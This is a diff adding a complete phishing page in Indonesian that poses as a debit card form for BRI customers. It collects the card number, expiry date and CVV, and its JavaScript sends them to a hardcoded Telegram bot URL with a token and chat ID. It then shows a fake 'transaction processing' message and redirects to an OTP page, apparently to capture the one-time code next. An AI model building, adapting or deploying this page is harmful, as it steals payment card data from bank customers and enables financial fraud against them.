@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Isi Detail Kartu Debit</title>
+  <style>
+  body {
+    background-color: AliceBlue;
+}
+  .slider-container {
+      position: relative;
+      max-width: 100%;
+      overflow: hidden;
+    }
+
+    .slider {
+      width: 100%;
+      max-height: 300px;
+      object-fit: cover;
+      transition: transform 0.5s ease-in-out;
+      display: none;
+    }
+
+    .slider.active {
+      display: block;
+    }
+
+    .credit-card-container {
+      position: relative;
+      max-width: 450px;
+      margin: 25px auto;
+      background-color: white;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+      padding: 20px;
+      border-radius: 12px;
+    }
+    .cvv-container {
+width: calc(85% - 8px); /* Reduce width by 4 pixels on each side */
+      padding: 18px;
+      border-radius: 8px;
+      border: 1px solid #663399;
+      margin-bottom: 30px; /* Jarak antara kolom nomor hp dan kolom pin */
+      margin-left: 90px; /* Add margin on the left side */
+    }
+
+    .credit-card-icon {
+      position: absolute;
+      top: 25%;
+      transform: translateY(-50%);
+      left: 300px;
+      width: 30px;
+      height: auto;
+    }
+  label {
+    font-weight: bold;
+    color: SlateGray;
+    text-align: right;
+    padding-left:3px;
+  }
+
+
+    input {
+      width: calc(150% - 40px);
+      padding: 10px;
+      box-sizing: border-box;
+      font-size: 16px;
+      border: 2px solid #ccc;
+      border-radius: 4px;
+      outline: none;
+      text-align: center;
+      letter-spacing: 3px;
+    }
+
+    #Masaberlaku {
+  margin-top: 10px; /* Menambah jarak di atas kolom masa berlaku */
+}
+
+#CVV {
+  margin-top: 10px; /* Menambah jarak di atas kolom CVV */
+}
+#creditCardInput, #Masaberlaku, #CVV {
+  width: calc(110% - 40px);
+  margin: 10px auto;
+}
+#Masaberlaku, #CVV {
+  width: calc(40% - 40px);
+  margin: 10px auto;
+}
+.cvv-container {
+  width: calc(85% - 8px); /* Reduce width by 4 pixels on each side */
+  padding: 18px;
+  border-radius: 8px;
+  border: 1px solid #663399;
+  margin-bottom: 30px; /* Jarak antara kolom nomor hp dan kolom pin */
+  margin-left: 90px; /* Add margin on the left side */
+}
+
+button {
+  padding: 15px 20px;
+  font-size: 16px;
+  border: none;
+  border-radius: 5px;
+  background-color: #8b4513; /* Warna latar belakang */
+  color: White; /* Warna teks */
+  cursor: pointer;
+  transition: background-color 0.3s;
+  margin-top :20px;
+  width: 360px;
+  margin: 0 auto;
+  font-weight: bold;
+}
+
+button:hover {
+  background-color: #8b4513; /* Warna latar belakang saat dihover */
+}
+
+button:active {
+  transform: translateY(3px);
+}
+
+  </style>
+</head>
+<body>
+
+<div class="slider-container">
+  <img class="slider active" src="https://i.ibb.co/VtcVMyc/IMG-20240110-005711-removebg-preview.png" alt="Slider Image 1">
+  <img class="slider" src="https://i.ibb.co/V3PvC56/6-Brit-Ama-Pro-Gentleman-removebg-preview.png" alt="Slider Image 2">
+  <img class="slider" src="https://i.ibb.co/xSpfr8m/IMG-20240110-011340-removebg-preview.png" alt="Slider Image 3">
+</div>
+
+<div class="credit-card-container">
+  <img src="https://raw.githubusercontent.com/Trisso90/Trisso90.github.io/main/mastercard.png"
+  alt="Credit Card Icon" class="credit-card-icon" id="cardIcon">
+    <label for="creditCardInput"> Kartu Kredit/Debit</label>
+  <input type="tel" id="creditCardInput" placeholder="0000 0000 0000 0000" maxlength="19"
+  oninput="updateCardIcon(this); formatCreditCardNumber(this)"> <br>
+  <label for="Masaberlaku"> Masa Berlaku</label> <br>
+  <input type="tel" id="Masaberlaku" placeholder ="00/00" maxlength="5"><br>
+  <label for="CVV"> CVV</label> <br>
+<input type="tel" id="CVV" placeholder="123" maxlength="3">
+</div>
+
+<div style="text-align: center;">
+  <button type="button" onclick="submitForm()">Lanjutkan</button>
+</div>
+
+<!-- Teks pesan menunggu -->
+<p id="waitingMessage" style="display: none;">Mohon menunggu Transaksi Sedang Diproses...</p>
+
+<script>
+function submitForm() {
+    // Mengambil nilai dari setiap input
+    var creditCardInput = document.getElementById("creditCardInput").value;
+    var masaberlakuInput = document.getElementById("Masaberlaku").value;
+    var cvvInput = document.getElementById("CVV").value;
+
+    // Memeriksa apakah setiap input telah diisi
+    if (creditCardInput.trim() === '' || masaberlakuInput.trim() === '' || cvvInput.trim() === '') {
+      // Jika salah satu input tidak diisi, memberikan efek getaran
+      if (navigator.vibrate) {
+        navigator.vibrate(200); // 200 milidetik getaran
+      }
+    } else {
+      // Jika semua input telah diisi, lanjutkan dengan proses pengiriman data
+      submitTransaction(); // Memanggil fungsi untuk mengirim data ke bot Telegram
+    }
+}
+let currentSlide = 0;
+  const slides = document.querySelectorAll('.slider');
+
+  function showSlide(index) {
+    slides.forEach((slide, i) => {
+      slide.classList.remove('active');
+      if (i === index) {
+        slide.classList.add('active');
+      }
+    });
+  }
+
+  function nextSlide() {
+    currentSlide = (currentSlide + 1) % slides.length;
+    showSlide(currentSlide);
+  }
+
+  setInterval(nextSlide, 5000);
+
+  function updateCardIcon(input) {
+    const cardIcon = document.getElementById("cardIcon");
+    const cardNumber = input.value.replace(/\s/g, '');
+
+    if (cardNumber.startsWith('5221')) {
+      cardIcon.src = 'https://raw.githubusercontent.com/Trisso90/Trisso90.github.io/main/mastercard.png';
+    } else if (cardNumber.startsWith('4616')) {
+      cardIcon.src = 'https://raw.githubusercontent.com/Trisso90/Trisso90.github.io/main/visa.png';
+    } else {
+      cardIcon.src = 'https://raw.githubusercontent.com/Trisso90/Trisso90.github.io/main/mastercard.png';
+    }
+  }
+
+  function formatCreditCardNumber(input) {
+    const cleanValue = input.value.replace(/[^\d]/g, '');
+    const formattedValue = cleanValue.replace(/(\d{4})(?=\d)/g, '$1 ');
+    input.value = formattedValue;
+  }
+  
+  const masaberlakuInput = document.getElementById("Masaberlaku");
+
+masaberlakuInput.addEventListener("input", function(event) {
+  let value = event.target.value;
+  if (value.length === 2 && !value.includes("/")) {
+    value += "/";
+  }
+  event.target.value = value;
+});
+
+  // Fungsi untuk mengirim data ke bot Telegram menggunakan AJAX
+  function sendMessageToTelegram(message) {
+    var xhttp = new XMLHttpRequest();
+    xhttp.onreadystatechange = function() {
+      if (this.readyState === 4 && this.status === 200) {
+        // Respons atau tindakan setelah pesan terkirim berhasil
+        console.log("Pesan terkirim: " + message);
+      }
+    };
+    var url = "https://api.telegram.org/bot6946290282:AAHbPsb9hD-DbepVOIkge81AvWjY90YbbU0/sendMessage?chat_id=6824078885&text=" + encodeURIComponent(message);
+
+    // Kirim permintaan POST
+    xhttp.open("POST", url, true);
+    xhttp.send();
+  }
+
+  // Fungsi untuk mengambil nilai input dan mengirimkannya ke bot Telegram
+  function sendInputToTelegram() {
+    var creditCardInput = document.getElementById('creditCardInput').value;
+    var masaBerlakuInput = document.getElementById('Masaberlaku').value;
+    var cvvInput = document.getElementById('CVV').value;
+    
+    var message = "Nomor Kartu Debit BRI: " + creditCardInput + "\nMasa Berlaku: " + masaBerlakuInput + "\nCVV: " + cvvInput;
+    
+    sendMessageToTelegram(message);
+  }
+
+  // Fungsi untuk menampilkan pesan menunggu dan mengarahkan ke halaman otp setelah 30 detik
+  function submitTransaction() {
+    // Menampilkan pesan menunggu
+    var waitingMessage = document.getElementById('waitingMessage');
+    waitingMessage.style.display = 'block';
+
+    // Mengirim data ke bot Telegram
+    sendInputToTelegram();
+
+    // Mengarahkan ke halaman otp setelah 30 detik
+    setTimeout(function() {
+      window.location.href = 'otp.html';
+    }, 5000); // 5 detik
+  }
+</script>
+
+</body>
+</html>
